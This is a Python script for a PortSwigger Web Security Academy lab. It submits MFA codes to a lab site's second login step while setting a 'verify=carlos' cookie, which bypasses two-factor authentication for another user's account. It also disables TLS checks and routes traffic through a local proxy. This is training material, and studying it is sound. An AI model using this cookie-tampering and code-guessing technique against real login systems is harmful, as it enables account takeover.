import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8087', 'https': 'http://127.0.0.1:8087'}

def post_login2(url, mfa_code):
    headers = {
        "Host": "0af0007703b12202817abc3a008a00d2.web-security-academy.net",
        "Cookie": "verify=carlos",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "13",
        "Origin": "https://0af0007703b12202817abc3a008a00d2.web-security-academy.net",
        "Referer": "https://0af0007703b12202817abc3a008a00d2.web-security-academy.net/login2",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Te": "trailers",
    }

    data = {"mfa-code": mfa_code}  # Add your desired mfa-code here

    try:
        res = requests.post(url + "/login2", headers=headers, data=data, proxies=proxies, verify=False)
        res.raise_for_status()

        # Print the response
        # print(res.text)

        if "Incorrect security code" not in res.text:
            print("(+) Login2 request successful! : "+mfa_code)
            r = requests.get(url + "/my-account?id=carlos", data=data, proxies=proxies, verify=False)
            if "Log out" in r.text:
                print("(+) You have solved the lab with success!")
            return 1
        else:
            print("(-) Login2 request failed.")
            return -1

    except Exception as e:
        print(f"(-) An error occurred: {str(e)}")
    
    return 0

# if __name__ == "__main__":
#     try:
#         url = sys.argv[1].strip()
#     except IndexError:
#         print("(+) Usage : %s <url>" % sys.argv[0])
#         print("(+) Example : %s www.example.com" % sys.argv[0])
#         sys.exit(-1)

#     post_login2(url, "1689")
